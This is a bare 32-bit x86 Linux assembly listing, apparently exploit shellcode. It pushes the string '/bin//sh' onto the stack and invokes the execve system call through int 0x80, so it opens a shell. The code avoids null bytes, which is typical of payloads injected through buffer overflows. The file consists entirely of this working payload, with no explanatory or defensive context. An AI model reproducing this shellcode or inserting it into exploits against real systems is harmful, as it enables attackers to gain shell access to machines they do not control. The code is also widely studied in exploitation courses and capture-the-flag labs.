BITS 32
global _start
_start:
    xor ecx,ecx
    xor edx,edx
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx,esp
    xor eax,eax
    mov al,0xb
    int 0x80
